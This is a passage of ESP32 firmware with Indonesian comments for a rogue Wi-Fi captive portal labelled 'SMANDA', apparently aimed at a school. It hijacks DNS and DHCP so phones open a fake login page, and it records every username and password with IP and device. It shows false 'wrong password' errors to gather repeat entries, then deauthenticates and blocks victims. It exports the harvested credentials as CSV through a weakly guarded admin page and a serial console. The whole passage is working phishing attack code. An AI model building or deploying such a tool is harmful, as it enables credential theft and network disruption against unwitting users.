  if (server.method() == HTTP_GET) {
    Serial.printf("[LOGIN] GET dari %s (ua=%s)\n",
                  server.client().remoteIP().toString().c_str(),
                  server.header("User-Agent").c_str());
    sendPortal("");
    return;
  }

  String u = server.arg("username");
  String p = server.arg("password");
  u.trim();

  IPAddress cip = server.client().remoteIP();
  String sig = u + "|" + p;
  Attempt *a = attemptFor(cip, true);

  /* duplikat = user+pass dari IP yang sama dengan entri terakhir -> jangan disimpan */
  bool dup = (a->last == sig);
  if (!dup && !creds.empty()) {
    String f[5]; int pos = 0;
    for (int i = 0; i < 5; i++) nextField(creds[0], pos, f[i]);
    if (f[1] == u && f[2] == p && f[3] == cip.toString()) dup = true;
  }
  if (!dup && (u.length() || p.length())) capture(u, p);
  else if (dup) Serial.printf("[SKIP] duplikat dari %s dibuang\n", cip.toString().c_str());

  a->last = sig;
  a->n++;

  if (a->n >= 3) {                 // percobaan ketiga: tampil berhasil + BLOKIR
    a->n = 0;
    a->last = "";
    addBlock(cip, u);
    Serial.printf("[OK] percobaan ke-3 dari %s -> halaman BERHASIL\n", cip.toString().c_str());
    server.sendHeader("Cache-Control", "no-store");
    server.send(200, "text/html; charset=utf-8", ui("/success.html", PAGE_OK));
    delay(400);                 // biar halaman "Berhasil" sempat terkirim utuh
    esp_wifi_deauth_sta(0);     // putus koneksi si klien begitu halaman berhasil terkirim
    Serial.println("[KICK] deauth setelah halaman berhasil");
    return;
  }

  server.sendHeader("Location", "http://" + apIP.toString() + "/proses", true);
  server.send(302, "text/plain", "");
}

void handleProses() {
  if (blockedGate()) return;
  server.sendHeader("Cache-Control", "no-store");
  server.send(200, "text/html; charset=utf-8", ui("/loading.html", PAGE_LOADING));
}

void handleHasil() {
  if (blockedGate()) return;
#if REPEAT_AFTER_LOGIN
  sendPortal("Username atau password salah. Silakan coba lagi.");
#else
  sendPortal("");
#endif
}

bool authOk() {
  if (!server.hasArg("k")) return true;      // /admin langsung, tanpa key
  return server.arg("k") == ADMIN_KEY;
}

void handleAdmin() {
  if (blockedGate()) return;
  if (!authOk()) { server.send(404, "text/plain", "404"); return; }

  String meta = String(creds.size()) + " akun | " + String(blockedList.size()) +
                " diblokir | " + WiFi.softAPgetStationNum() +
                " klien | up " + upTime();

  String rows;
  if (creds.empty()) {
    rows = "<tr><td colspan=6><div class=\"empty\">Belum ada kredensial tertangkap.</div></td></tr>";
  } else {
    int n = 0;
    for (const String &l : creds) {
      int pos = 0; String f[5];
      for (int i = 0; i < 5; i++) nextField(l, pos, f[i]);
      rows += "<tr><td>" + String(++n) + "</td><td>" + esc(f[0]) +
              "</td><td class=\"k\">" + esc(f[1]) + "</td><td class=\"k\">" + esc(f[2]) +
              "</td><td>" + esc(f[3]) + "</td><td>" + esc(f[4]) + "</td></tr>\n";
    }
  }

  String body;
  if (!fsLoad("/admin.html", body)) {
    body = String(FPSTR(PAGE_ADMIN_HEAD)) + "%ROWS%" + String(FPSTR(PAGE_ADMIN_TAIL));
  }
  body.replace("%ROWS%", rows);
  body.replace("%META%", meta);
  body.replace("%KEY%", String(ADMIN_KEY));

  server.sendHeader("Cache-Control", "no-store");
  server.send(200, "text/html; charset=utf-8", body);
}

void handleCsv() {
  if (blockedGate()) return;
  if (!authOk()) { server.send(404, "text/plain", "404"); return; }
  String csv = "waktu,username,password,ip,device\n";
  for (const String &l : creds) {
    int pos = 0; String f[5];
    for (int i = 0; i < 5; i++) nextField(l, pos, f[i]);
    for (int i = 0; i < 5; i++) {
      f[i].replace("\"", "\"\"");
      csv += "\"" + f[i] + "\"";
      csv += (i < 4) ? "," : "\n";
    }
  }
  server.sendHeader("Content-Disposition", "attachment; filename=\"smanda-creds.csv\"");
  server.send(200, "text/csv; charset=utf-8", csv);
}

void handleClear() {
  if (blockedGate()) return;
  if (!authOk()) { server.send(404, "text/plain", "404"); return; }
  creds.clear();
  LittleFS.remove(CRED_FILE);
  Serial.println("[!] log dihapus");
  server.sendHeader("Location", "/admin", true);
  server.send(302, "text/plain", "");
}

/* ==================== KONSOL SERIAL (USB) ========================= */
/* Ambil data tanpa perlu nyambung ke Wi-Fi ESP32 sama sekali.
   Ketik perintah lewat kabel USB (115200): help | count | csv | dump | status | wipe */
String serBuf;

void csvRow(const String &line) {
  String f[5];
  int pos = 0;
  for (int i = 0; i < 5; i++) nextField(line, pos, f[i]);
  String out;
  for (int i = 0; i < 5; i++) {
    f[i].replace("\"", "\"\"");
    out += "\"" + f[i] + "\"";
    out += (i < 4) ? "," : "";
  }
  Serial.println(out);
}

void cmdCount() {
  File f = LittleFS.open(CRED_FILE, FILE_READ);
  int n = 0;
  if (f) { while (f.available()) { String l = f.readStringUntil('\n'); l.trim(); if (l.length()) n++; } f.close(); }
  Serial.printf("[CMD] %d entri tersimpan di %s | RAM %u\n", n, CRED_FILE, (unsigned)creds.size());
}

void cmdCsv() {
  File f = LittleFS.open(CRED_FILE, FILE_READ);
  Serial.println("waktu,username,password,ip,device");
  if (f) {
    while (f.available()) {
      String l = f.readStringUntil('\n');
      l.trim();
      if (l.length()) csvRow(l);
      delay(0);
    }
    f.close();
  }
  Serial.println("###END###");
}

void cmdDump() {
  File f = LittleFS.open(CRED_FILE, FILE_READ);
  int n = 0;
  if (f) {
    while (f.available()) {
      String l = f.readStringUntil('\n'); l.trim();
      if (!l.length()) continue;
      String fld[5]; int pos = 0;
      for (int i = 0; i < 5; i++) nextField(l, pos, fld[i]);
      Serial.printf("#%d  %s | %s : %s | %s | %s\n", ++n, fld[0].c_str(),
                    fld[1].c_str(), fld[2].c_str(), fld[3].c_str(), fld[4].c_str());
      delay(0);
    }
    f.close();
  }
  Serial.printf("[CMD] dump selesai, %d entri\n###END###\n", n);
}

void cmdBlocked() {
  if (blockedList.empty()) { Serial.println("[CMD] tidak ada IP diblokir"); return; }
  for (auto &b : blockedList)
    Serial.printf("[BLOCK] %-15s %s  sejak %s\n", b.ip.toString().c_str(), b.mac.c_str(), b.at.c_str());
}

void cmdUnblock(String arg) {
  arg.trim();
  if (!arg.length() || arg == "all") {
    blockedList.clear();
    LittleFS.remove(BLOCK_FILE);
    Serial.println("[CMD] semua blokir dihapus");
    return;
  }
  IPAddress t;
  if (!t.fromString(arg)) { Serial.println("[CMD] format: unblock <ip> | unblock all"); return; }
  for (size_t i = 0; i < blockedList.size(); i++) {
    if (blockedList[i].ip == t) {
      blockedList.erase(blockedList.begin() + i);
      File f = LittleFS.open(BLOCK_FILE, FILE_WRITE);
      if (f) { for (auto &b : blockedList) f.println(b.mac + "|" + b.ip.toString() + "|" + b.at + "|"); f.close(); }
      Serial.printf("[CMD] %s dibuka\n", arg.c_str());
      return;
    }
  }
  Serial.println("[CMD] IP itu tidak ada di daftar blokir");
}

void cmdWipe() {
  creds.clear();
  LittleFS.remove(CRED_FILE);
  blockedList.clear();
  LittleFS.remove(BLOCK_FILE);
  Serial.println("[CMD] semua log + daftar blokir dihapus (RAM + LittleFS)");
}

void cmdStatus() {
  Serial.printf("[CMD] up=%s klien=%d dns=%lu dhcp_ack=%lu ram_entri=%u heap=%lu\n",
                upTime().c_str(), WiFi.softAPgetStationNum(), dnsQueries,
                dhcpAcks, (unsigned)creds.size(), (unsigned long)ESP.getFreeHeap());
}

void cmdUi() {
  const char *files[] = {"/portal.html", "/jump.html", "/loading.html",
                         "/success.html", "/admin.html"};
  for (const char *f : files) {
    File h = LittleFS.open(f, "r");
    if (h) { Serial.printf("[UI] %-14s %5u byte (LittleFS)\n", f, (unsigned)h.size()); h.close(); }
    else   { Serial.printf("[UI] %-14s - (pakai HTML bawaan)\n", f); }
  }
  Serial.printf("[UI] FS terpakai %u / %u byte\n",
                (unsigned)LittleFS.usedBytes(), (unsigned)LittleFS.totalBytes());
}

void handleCmd(String c) {
  c.trim();
  c.toLowerCase();
  if (!c.length()) return;
  Serial.printf("[CMD] >> %s\n", c.c_str());
  if (c == "help") {
    Serial.println("[CMD] count | csv/backup | dump | status | wipe | ui | blocked | unblock [ip|all]");
  } else if (c == "count")  { cmdCount(); }
  else if (c == "csv" || c == "backup") { cmdCsv(); }
  else if (c == "dump")     { cmdDump(); }
  else if (c == "status")   { cmdStatus(); }
  else if (c == "wipe")     { cmdWipe(); }
  else if (c == "ui")       { cmdUi(); }
  else if (c == "blocked")  { cmdBlocked(); }
  else if (c.startsWith("unblock")) { cmdUnblock(c.substring(7)); }
  else                      { Serial.println("[CMD] ? ketik help"); }
}

void serialTick() {
  while (Serial.available()) {
    char ch = (char)Serial.read();
    if (ch == '\r') continue;
    if (ch == '\n') { handleCmd(serBuf); serBuf = ""; }
    else if (serBuf.length() < 120) serBuf += ch;
  }
}

/* ====================== LED ======================================= */
void ledTick() {
  unsigned long now = millis();
  if (blinkLeft > 0 && now - lastBlink > 120) {
    lastBlink = now;
    digitalWrite(LED_PIN, !digitalRead(LED_PIN));
    blinkLeft--;
    if (blinkLeft == 0) digitalWrite(LED_PIN, LOW);
  }
}

/* ====================== SETUP ===================================== */
void setup() {
  Serial.begin(115200);
  delay(200);
  Serial.println("\n\n=== SMANDA CAPTIVE PORTAL (ESP32) ===");

  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  if (!LittleFS.begin(true)) {
    Serial.println("[FS] mount gagal, log hanya di RAM");
  }
  loadCreds();
  loadBlocked();

  WiFi.persistent(false);
  WiFi.mode(WIFI_AP);
  WiFi.setSleep(false);
  WiFi.softAPConfig(apIP, apGateway, apMask);
  bool ok = WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL, 0, MAX_CLIENTS);
  Serial.printf("[AP] %s %s | IP %s\n", ok ? "UP" : "GAGAL",
                AP_SSID, WiFi.softAPIP().toString().c_str());

  /* ---- KUNCI CAPTIVE PORTAL: DHCP wajib menawarkan DNS = ESP32 ----
     Tanpa ini HP tidak bisa resolve connectivitycheck.gstatic.com,
     probe gagal, HP cuma bilang "tanpa internet" dan sheet login TIDAK
     muncul. Ini penyebab gejala "harus buka Chrome manual".            */
  ip_addr_t dnsAddr;
  IP_ADDR4(&dnsAddr, 203, 0, 113, 1);
  dhcps_dns_setserver(&dnsAddr);
  ip4_addr_t back = dhcps_dns_getserver();
  Serial.printf("[DHCP] DNS option 6 -> %s\n", ip4addr_ntoa(&back));

  esp_netif_t *apNetif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
  if (apNetif) {
    esp_netif_dns_info_t di;
    memset(&di, 0, sizeof(di));
    di.ip.type = ESP_IPADDR_TYPE_V4;
    di.ip.u_addr.ip4.addr = (uint32_t)apIP;
    Serial.printf("[DHCP] netif dns set -> %d\n",
                  (int)esp_netif_set_dns_info(apNetif, ESP_NETIF_DNS_MAIN, &di));

    /* RFC 8910 option 114 (captive portal URI). IDF 4.4 belum dukung;
       kalau ditolak, jalur probe HTTP/DNS di bawah yang menangani.       */
    String cpUrl = String("http://") + apIP.toString() + "/captive-portal-api";
    Serial.printf("[DHCP] opt114 -> %d\n",
                  (int)esp_netif_dhcps_option(apNetif, ESP_NETIF_OP_SET,
                                              (esp_netif_dhcp_option_id_t)114,
                                              (void *)cpUrl.c_str(), cpUrl.length() + 1));
  }

  dnsBegin();
  Serial.println("[DNS] wildcard aktif :53 (logging on)");
  dhcpBegin();

  server.on("/",                    HTTP_GET,  handleRoot);
  server.on("/index.html",          HTTP_GET,  handleRoot);
  server.on("/login",               HTTP_POST, handleLogin);
  server.on("/login",               HTTP_GET,  handleLogin);
  server.on("/proses",              HTTP_GET,  handleProses);
  server.on("/hasil",               HTTP_GET,  handleHasil);
  server.on("/admin",               HTTP_GET,  handleAdmin);
  server.on("/admin.csv",           HTTP_GET,  handleCsv);
  server.on("/admin/clear",         HTTP_GET,  handleClear);
  server.on("/wpad.dat",            HTTP_GET,  handlePac);
  server.on("/proxy.pac",           HTTP_GET,  handlePac);

  /* probe captive-portal detection: Android, iOS, Windows, Kindle, Firefox */
  const char *probes[] = {
    "/generate_204", "/gen_204", "/mobile/status.php", "/check_network_status.txt",
    "/hotspot-detect.html", "/library/test/success.html", "/success.txt",
    "/connecttest.txt", "/redirect", "/ncsi.txt", "/canonical.html",
    "/kindle-wifi/wifistub.html", "/favicon.ico", "/captiveportal",
    "/generate204", "/204", "/checkip", "/status", "/wispr"
  };
  for (const char *p : probes) {
    server.on(p, HTTP_GET,  handleProbe);
    server.on(p, HTTP_HEAD, handleProbe);
  }
  server.on("/captive-portal-api", HTTP_GET, handleCapport);

  /* WebServer cuma simpan header yang didaftarkan -> tanpa ini kolom device kosong */
  static const char *hdrKeys[] = {"User-Agent", "Cookie", "Referer"};
  server.collectHeaders(hdrKeys, 3);
  server.onNotFound(handleNotFound);
  server.begin();
  Serial.println("[HTTP] server on :80");
  Serial.printf("[ADMIN] http://%s/admin  (key opsional: ?k=%s)\n",
                apIP.toString().c_str(), ADMIN_KEY);
  Serial.println("[CMD] ketik: help | count | csv | dump | status | wipe | ui");
  Serial.println("=== READY ===");
}

/* ====================== LOOP ====================================== */
void loop() {
  serialTick();
  dnsTick();
  dhcpTick();
  server.handleClient();
  ledTick();

  kickBlockedClients();

  /* laporan klien: bukti HP benar-benar associate + dapat IP */
  static int lastSta = -1;
  int sta = WiFi.softAPgetStationNum();
  if (sta != lastSta) {
    Serial.printf("[WIFI] klien terhubung: %d | dns query: %lu\n", sta, dnsQueries);
    lastSta = sta;
  }
  delay(1);
}
